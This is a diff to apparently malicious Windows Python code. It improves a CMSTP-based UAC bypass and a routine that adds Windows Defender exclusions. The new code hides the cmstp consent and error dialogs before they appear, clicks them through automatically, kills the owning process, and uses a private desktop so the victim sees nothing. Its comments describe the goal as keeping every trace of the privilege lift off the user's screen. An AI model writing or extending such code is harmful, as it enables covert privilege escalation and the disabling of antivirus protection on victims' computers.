@@ -63,11 +63,8 @@ user32 = ctypes.windll.user32
 PROCESS_TERMINATE = 0x0001
 TH32CS_SNAPPROCESS = 0x00000002
 SW_HIDE = 0
-WM_CLOSE = 0x0010
-WM_KEYDOWN = 0x0100
 WM_KEYUP = 0x0101
 BM_CLICK = 0x00F5
-VK_RETURN = 0x0D
 SWP_NOMOVE = 0x0002
 SWP_NOSIZE = 0x0001
 SWP_NOACTIVATE = 0x0010
@@ -197,92 +194,237 @@ def cleanup_infs():
 
 
 # ---- the admin lift — majanito cmstp shape ---------------------------------
+# r139 (dj: "the exe opens but it also throws this error next to it"): the box
+# is cmstp's own "The service profile is damaged. Reinstall the service
+# profile." — the profile installer raises it AFTER RunPreSetupCommands already
+# ran. the lift works; the leftover box is the whole damage. the old guard
+# found ONE window, posted WM_CLOSE/Enter on it blind (a CLOSED profile dialog
+# is an ABORTED profile, and cmstp answers that with exactly this box) and went
+# to sleep at +8 s — anything later painted on the desktop and stayed. r139:
+#   - read the dialog before answering it: OK on a consent box, OK on an
+#     informational one, owner terminated only for a box that says
+#     damaged/corrupt. no blind WM_CLOSE on an unread window, ever
+#   - keep working for EVERY dialog until the lift is quiet (cmstp gone + no
+#     new box), instead of dying on the first hit
+#   - hide-first stays: the box never paints a frame either way
+IDOK = 1
+WM_COMMAND = 0x0111
+AFFIRMATIVE = ("ok", "yes", "continue", "install",
+               "make this connection available", "allow")
+ERROR_SHAPE = ("damaged", "reinstall", "corrupt", "cannot", "can't",
+               "failed", "invalid", "unable")
+
+# prototypes for the calls the guard adds — a degraded runtime (no
+# GetClassNameW forwarded) must not take the payload down at import; the guard
+# then simply finds no dialog class to read
+try:
+    user32.GetClassNameW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
+except Exception:
+    pass
+try:
+    user32.IsWindow.argtypes = [ctypes.c_void_p]
+    user32.IsWindow.restype = ctypes.c_int
+except Exception:
+    pass
+try:
+    user32.EnumChildWindows.restype = ctypes.c_int
+    user32.EnumChildWindows.argtypes = [
+        ctypes.c_void_p,
+        ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
+        ctypes.c_void_p]
+except Exception:
+    pass
+
+
+def _win_class(hwnd):
+    try:
+        buf = ctypes.create_unicode_buffer(128)
+        user32.GetClassNameW(hwnd, buf, 128)
+        return buf.value
+    except Exception:
+        return ""
+
+
+def _exists(hwnd):
+    """r139: does the window still EXIST — not 'is it visible'. we hide every
+    box before answering it, so IsWindowVisible can never tell us whether the
+    answer took; existence can."""
+    try:
+        return bool(user32.IsWindow(hwnd))
+    except Exception:
+        try:
+            return bool(user32.IsWindowVisible(hwnd))
+        except Exception:
+            return False
+
+
+def _children(hwnd):
+    """[(hwnd, caption)] for every child control — a dialog says what it is in
+    its Static/Button captions, and those captions are how the guard tells
+    'install this' from 'the service profile is damaged'."""
+    out = []
+
+    try:
+        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
+        def cb(child, lp):
+            buf = ctypes.create_unicode_buffer(512)
+            user32.GetWindowTextW(child, buf, 512)
+            out.append((child, buf.value))
+            return 1
+
+        user32.EnumChildWindows(hwnd, cb, 0)
+    except Exception:
+        return out
+    return out
+
+
 class Dismisser:
-    """hides + completes the cmstp lift dialog. r42: the ~0.1 s flash was this
-    hunting at Windows' real timer resolution (~15ms sleep granularity) AFTER
-    the dialog had already painted. hunting is now OWNERSHIP-driven and
-    frame-tight: any top-level window owned by the cmstp pid (visible or
-    hidden, any title) is hidden + completed the instant it is enumerated —
-    a tight spin, no sleeps, so the observer lands ahead of the paint."""
-    def __init__(self, title):
-        self.title = title
+    """r139: the lift's dialog guard — alive until the lift is quiet.
+
+    every top-level window owned by the spawned cmstp, or carrying our random
+    service name in its title (the shape the late damaged-profile box arrives
+    in), is hidden first and answered second. the answer is the dialog's own
+    affirmative control / IDOK — never a bare WM_CLOSE, because a closed
+    profile dialog is an aborted install and that is what cmstp reports as a
+    damaged profile."""
+
+    def __init__(self, title, cap=30.0):
+        self.titles = [t.lower() for t in
+                       (title, "Connection Manager Profile Installer") if t]
+        self.stop = threading.Event()
         self.done = threading.Event()
         self.target_pid = 0   # set to the spawned cmstp pid before .start()
+        self.cap = cap
+        self.handled = 0
+        self.seen = {}        # hwnd -> answered-at: the same box is never re-answered
+        # settle() scans from the caller's thread while run() still spins in
+        # its own — one lock, so a box cannot be answered twice at once
+        self.lock = threading.Lock()
 
-    def _win_owner(self, hwnd):
+    # ---- window facts
+    def _owner(self, hwnd):
         pid = ctypes.c_ulong()
         user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
         return pid.value
 
-    def find_window(self):
-        want = [w.lower() for w in
-                (self.title, "Connection Manager Profile Installer") if w]
-        for hwnd in _window_titles():
-            if self.target_pid and self._win_owner(hwnd) == self.target_pid:
-                return hwnd   # owned by cmstp: hunt hides it before it paints
-            if not user32.IsWindowVisible(hwnd):
-                continue
-            t = window_title(hwnd).lower()
-            if any(w in t for w in want):
-                return hwnd
-        return None
+    def _mine(self, hwnd):
+        if self.target_pid and self._owner(hwnd) == self.target_pid:
+            return True
+        t = window_title(hwnd).lower()
+        return any(w in t for w in self.titles)
 
-    def dismiss(self, hwnd):
+    def _is_dialog(self, hwnd):
+        if _win_class(hwnd) == "#32770":
+            return True
+        # hosts where the profile box is not a plain dialog class: still ours
+        # when the title carries the name OUR inf just generated — and nothing
+        # else in the process's window set is touched
+        return bool(self.titles) and self.titles[0] in window_title(hwnd).lower()
+
+    # ---- window actions
+    def _hide(self, hwnd):
+        user32.ShowWindow(hwnd, SW_HIDE)
         user32.SetWindowPos(hwnd, HWND_BOTTOM, 0, 0, 0, 0,
                             SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE)
-        user32.ShowWindow(hwnd, SW_HIDE)
-        user32.SetForegroundWindow(hwnd)
-        # r5: BM_CLICK on the FIRST child Button hit the 'All users' radio —
-        # the consent dialog stayed up (the ss dialog) and cmstp still waited.
-        # enumerate children, click the one actually labeled OK; Enter+Close
-        # as the fallback triad so the dialog never outlives us.
-        user32.EnumChildWindows.restype = ctypes.c_int
-        user32.EnumChildWindows.argtypes = [
-            ctypes.c_void_p,
-            ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
-            ctypes.c_void_p]
-        clicked = []
 
-        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
-        def _ok(child, lp):
-            buf = ctypes.create_unicode_buffer(64)
-            user32.GetWindowTextW(child, buf, 64)
-            if buf.value == "OK":
+    def _answer(self, hwnd):
+        """the dialog's own command channel: a labeled affirmative button when
+        there is one (the profile dialog's button is not always id 1), IDOK
+        otherwise. no Enter, no WM_CLOSE — both can land on Cancel."""
+        for child, text in _children(hwnd):
+            if _win_class(child) != "Button":
+                continue
+            if text.strip().lower() in AFFIRMATIVE:
                 user32.PostMessageW(child, BM_CLICK, 0, 0)
-                clicked.append(child)
-            return 1
+                return True
+        user32.PostMessageW(hwnd, WM_COMMAND, IDOK, 0)
+        return False
 
-        user32.EnumChildWindows(hwnd, _ok, 0)
-        if not clicked:
-            b = user32.FindWindowExW(hwnd, None, "Button", None)
-            if b:
-                user32.PostMessageW(b, BM_CLICK, 0, 0)
-        user32.PostMessageW(hwnd, WM_KEYDOWN, VK_RETURN, 0)
-        user32.PostMessageW(hwnd, WM_KEYUP, VK_RETURN, 0)
-        user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
+    def _kill_owner(self, hwnd):
+        pid = self._owner(hwnd)
+        if not pid or pid == os.getpid():
+            return
+        try:
+            h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
+            if h:
+                kernel32.TerminateProcess(h, 0)
+                kernel32.CloseHandle(h)
+        except Exception:
+            pass
+
+    def handle(self, hwnd):
+        text = " ".join([window_title(hwnd)] + [t for _, t in _children(hwnd)]).lower()
+        errorish = any(w in text for w in ERROR_SHAPE)
+        self._hide(hwnd)          # no frame on the user's screen, ever
+        self._answer(hwnd)
+        if errorish:
+            # informational: the lift is already through, the box is not — OK
+            # dismisses it, and an owner that keeps it up after OK is killed
+            time.sleep(0.25)
+            if _exists(hwnd):
+                self._hide(hwnd)
+                self._kill_owner(hwnd)
+        self.seen[hwnd] = time.time()
+        return errorish
+
+    # ---- the loop
+    def scan(self):
+        n = 0
+        with self.lock:
+            for hwnd in _window_titles():
+                try:
+                    # an answered box stays skipped while it is gone; a handle
+                    # that came back VISIBLE (re-shown, or recycled by a fresh
+                    # box) gets read and answered again
+                    if hwnd in self.seen and not user32.IsWindowVisible(hwnd):
+                        continue
+                    if not self._mine(hwnd) or not self._is_dialog(hwnd):
+                        continue
+                    self.handle(hwnd)
+                    n += 1
+                except Exception:
+                    continue
+            if n:
+                self.handled += n
+                self.done.set()
+            return n
 
     def run(self):
-        # r42: tight spin — EnumWindows per iteration is microseconds and the
-        # dialog appears within ~50-100ms of the spawned cmstp, so spinning
-        # beats any sleep granularity even at the timer floor.
-        import time as _t
-        end = _t.time() + 8.0
-        while _t.time() < end:
-            hwnd = self.find_window()
-            if hwnd:
-                self.dismiss(hwnd)
-                self.done.set()
-                return
-            # r45: 3ms pace — still far inside the paint-timer floor (a window
-            # is caught within ~3ms of showing), without pegging a full core
-            # for the whole 8s window when the dialog never comes up.
-            _t.sleep(0.003)
+        end = time.time() + self.cap
+        while not self.stop.is_set() and time.time() < end:
+            self.scan()
+            # 4ms: inside the paint-timer floor (a box is caught within a frame
+            # of showing) without pegging a core for the whole life
+            time.sleep(0.004)
 
     def start(self):
         threading.Thread(target=self.run, daemon=True).start()
 
-    def wait(self, timeout=5.0):
+    def wait(self, timeout=8.0):
         self.done.wait(timeout)
+
+    def settle(self, quiet=2.0, floor=10.0, cap=18.0):
+        """r139: the lift is over when cmstp is GONE and no new box showed up
+        for `quiet` seconds — that is exactly the window the late
+        damaged-profile box used to land in, with our guard already asleep.
+
+        `floor` is the point: cmstp usually exits right after it fires the
+        commands, so 'cmstp gone' alone would still switch the guard off a
+        second or two after the consent click — before the staged python has
+        even finished, which is when the profile validator complains. the
+        guard therefore never leaves before `floor` seconds of watch."""
+        start = time.time()
+        end = start + cap
+        last = start
+        while time.time() < end:
+            if self.scan():
+                last = time.time()
+            elif (not proc_alive("cmstp.exe") and time.time() - last >= quiet
+                  and time.time() - start >= floor):
+                break
+            time.sleep(0.05)
+        self.stop.set()
+        return self.handled
 
 
 # r135: the INF terminator (a script-hosted force-kill pad) is GONE. the lift's
@@ -410,9 +552,9 @@ def uac_bypass(cmd):
     dismisser.start()
 
     dismisser.wait(8.0)
-    time.sleep(0.3)
-    _sweep_dialogs(svc_name)   # close any survivor the dismisser raced
+    dismisser.settle()         # r139: stay awake until the lift is quiet
     kill_all_cmstp()           # r135: the INF no longer kills cmstp — the API does it
+    _sweep_dialogs(svc_name)   # r139: any survivor is hidden + answered
     try:
         os.unlink(inf_path)
     except Exception:
@@ -434,7 +576,8 @@ def _lift_desktop(name="sf_lift_dsk"):
     desk = uac.CreateDesktopW(name, None, None, 0, 0x0200, None)   # GENERIC_ALL
     if not desk:
         yield False   # no private desktop — lift rides the interactive desk as before
-        returnold = uac.GetThreadDesktop(k32.GetCurrentThreadId())
+        return
+    old = uac.GetThreadDesktop(k32.GetCurrentThreadId())
     uac.SwitchDesktop(desk)
     try:
         yield True
@@ -459,20 +602,17 @@ def run_elevated(exe_path):
     except Exception:
         return False
 
-def _sweep_dialogs(svc_name, seconds=3.0):
-    """Best-effort post-lift cleanup: any leftover lift dialog (the 'Make this
-    connection available' profile or the CMPI error box) gets WM_CLOSE until
-    nothing answerable remains."""
+def _sweep_dialogs(svc_name, seconds=2.0):
+    """r139: post-lift cleanup for anything that outlived the guard — hidden
+    and ANSWERED (IDOK / the affirmative button), never WM_CLOSEd: a closed
+    profile dialog is what cmstp reports back as a damaged service profile."""
+    helper = Dismisser(svc_name)
     end = time.time() + seconds
-    want = [w.lower() for w in (svc_name, "Connection Manager Profile Installer") if w]
     while time.time() < end:
-        for hwnd in _window_titles():
-            if not user32.IsWindowVisible(hwnd):
-                continue
-            t = window_title(hwnd).lower()
-            if any(w in t for w in want):
-                user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
-        time.sleep(0.2)
+        helper.seen.clear()      # a survivor gets the treatment again
+        if not helper.scan():
+            time.sleep(0.1)
+    return helper.handled
 
 
 def exclusion_landed():
@@ -717,9 +857,9 @@ def set_defender_exclusions():
     dismisser.start()
 
     dismisser.wait(8.0)
-    time.sleep(0.3)
-    _sweep_dialogs(svc_name)
-    kill_all_cmstp()   # r135: API-side terminator, same timing the INF pad had
+    dismisser.settle()  # r139: stay awake until the lift is quiet
+    kill_all_cmstp()    # r135: API-side terminator, same timing the INF pad had
+    _sweep_dialogs(svc_name)   # r139: any survivor is hidden + answered
     try:
         os.unlink(inf_path)
     except Exception:
